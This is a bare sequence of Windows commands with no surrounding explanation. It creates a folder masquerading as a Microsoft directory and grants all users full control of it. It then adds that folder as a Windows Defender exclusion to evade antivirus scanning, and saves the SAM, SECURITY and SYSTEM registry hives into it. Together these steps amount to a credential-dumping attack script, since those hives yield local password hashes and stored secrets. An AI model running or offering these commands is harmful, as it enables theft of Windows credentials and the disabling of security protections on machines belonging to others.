md "C:\Program Files\Common Files\Microsoft"
icacls "C:\Program Files\Common Files\Microsoft" /q /c /t /grant Users:F
powershell -command "Add-MpPreference -ExclusionPath 'C:\Program Files\Common Files\Microsoft'"
cd "C:\Program Files\Common Files\Microsoft"
reg.exe save hklm\sam %CD%\sam.save
reg.exe save hklm\security %CD%\security.save
reg.exe save hklm\system %CD%\system.save
